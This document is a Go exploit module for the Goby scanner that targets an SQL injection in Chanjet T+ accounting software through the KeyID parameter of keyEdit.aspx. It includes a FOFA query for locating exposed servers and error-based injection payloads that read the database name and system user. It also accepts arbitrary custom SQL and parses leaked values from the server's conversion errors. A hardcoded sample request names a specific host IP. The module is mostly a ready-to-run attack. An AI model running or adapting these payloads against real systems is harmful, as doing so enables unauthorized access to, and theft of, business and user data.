package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yongyou tplus  /tplus/UFAQD/keyEdit.aspx file KeyID parameter SQL Injection Vulnerability",
    "Description": "<p>Changjietong Tplusis a flexible, intelligent and fashionable management software developed based on the Internet era. It is mainly aimed at small and medium-sized industrial, trade and commercial enterprises, especially for enterprises with multiple organizations in different places (multiple factories, multiple warehouses, multiple offices, multiple dealers), covering applications in finance, business, production and other fields </p><p>There is an SQL injection vulnerability at the KeyEdit interface of Changjie Tong, which allows attackers to access data in the database without authorization, thereby stealing user data and causing user information leakage</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2024-05-17",
    "PostTime": "2024-05-17",
    "Author": "15900373599@163.com",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "Level": "2",
    "Impact": "<p>There is an SQL injection vulnerability at the KeyEdit interface of Changjie Tong, which allows attackers to access data in the database without authorization, thereby stealing user data and causing user information leakage</p>",
    "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks </p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range. </p><p>3. Assign database users the minimum permissions, limited to their required operations.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "查看当前数据库名,查看用户名,custom,sqlPoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "222%27%20and%201=(select%20@@version)%20--",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20db_name())%20--&preload=1",
                "follow_redirect": true,
                "header": {
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "nvarchar",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulUrl|lastbody|variable|{{{fixedhostinfo}}}/tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20db_name())%20--&preload=1"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "用友畅捷通 /tplus/UFAQD/keyEdit.aspx 文件 KeyID 参数 SQL 注入漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通 T+ 是一款灵动，智慧，时尚的基于互联网时代开发的管理软件，主要针对中小型工贸与商贸企业，尤其适合有异地多组织机构（多工厂，多仓库，多办事处，多经销商）的企业，涵盖了财务，业务，生产等领域的应用</p><p>畅捷通keyEdit接口处存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露<br></p>",
            "Recommendation": "<p>\t1.使用参数化查询可以有效防止SQL注入攻击&nbsp;</p><p>2.在接受用户输入之前，应该对输入数据进行验证和过滤，确保输入的数据符合预期的格式和范围。&nbsp;</p><p>3.将数据库用户赋予最小的权限，仅限于其所需的操作。<br></p>",
            "Impact": "<p>畅捷通keyEdit接口处存在SQL注入漏洞，攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yongyou tplus  /tplus/UFAQD/keyEdit.aspx file KeyID parameter SQL Injection Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Changjietong Tplusis a flexible, intelligent and fashionable management software developed based on the Internet era. It is mainly aimed at small and medium-sized industrial, trade and commercial enterprises, especially for enterprises with multiple organizations in different places (multiple factories, multiple warehouses, multiple offices, multiple dealers), covering applications in finance, business, production and other fields&nbsp;</p><p>There is an SQL injection vulnerability at the KeyEdit interface of Changjie Tong, which allows attackers to access data in the database without authorization, thereby stealing user data and causing user information leakage<br></p>",
            "Recommendation": "<p>1. Using parameterized queries can effectively prevent SQL injection attacks&nbsp;</p><p>2.Before accepting user input, the input data should be validated and filtered to ensure that it meets the expected format and range.&nbsp;</p><p>3. Assign database users the minimum permissions, limited to their required operations.<br></p>",
            "Impact": "<p>There is an SQL injection vulnerability at the KeyEdit interface of Changjie Tong, which allows attackers to access data in the database without authorization, thereby stealing user data and causing user information leakage<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	sqlInjectionXcsxcwjw := func(hostInfo *httpclient.FixUrl, sqlPayload string) string {
		vulUrl := "/tplus/UFAQD/keyEdit.aspx?KeyID=" + sqlPayload + "&preload=1"
		httpConfig := httpclient.NewGetRequestConfig(vulUrl)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
		httpConfig.Header.Store("Accept-Language", "zh-CN,zh;q=0.9")
		httpConfig.Header.Store("Accept-Encoding", "gzip, deflate, br")
		httpConfig.Header.Store("Upgrade-Insecure-Requests", "1")
		httpConfig.Header.Store("Connection", "close")
		httpConfig.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return ""
		}
		if strings.Contains(resp.Utf8Html, "nvarchar") {
			reMsg := regexp.MustCompile("在将 nvarchar 值(.*?)转换")
			matchesMsg := reMsg.FindStringSubmatch(resp.Utf8Html)
			if len(matchesMsg) > 1 {

				return matchesMsg[1]
			}
		}
		return ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			custom := ss.Params["custom"].(string)
			var msg string
			var sqlPayload string
			if attackType == "查看当前数据库名" {
				sqlPayload = "222%27%20and%201=(select%20db_name())%20--"
				msg = sqlInjectionXcsxcwjw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}
			} else if attackType == "查看用户名" {
				sqlPayload = "222%27%20and%201=(select%20SYSTEM_USER)%20--"
				msg = sqlInjectionXcsxcwjw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "custom" {
				sqlPayload = custom
				msg = sqlInjectionXcsxcwjw(expResult.HostInfo, sqlPayload)
				if msg == "" {
					expResult.Output = "未知的攻击方式！"
					return expResult
				}

			} else if attackType == "sqlPoint" {
				expResult.Output = "GET /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1\nHost:1.56.78.15:9091\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close"
				expResult.Success = true
				return expResult
			} else {
				expResult.Output = "未知的攻击方式！"
			}
			expResult.Success = true
			expResult.Output = sqlPayload + ":" + msg
			return expResult
		},
	))
}
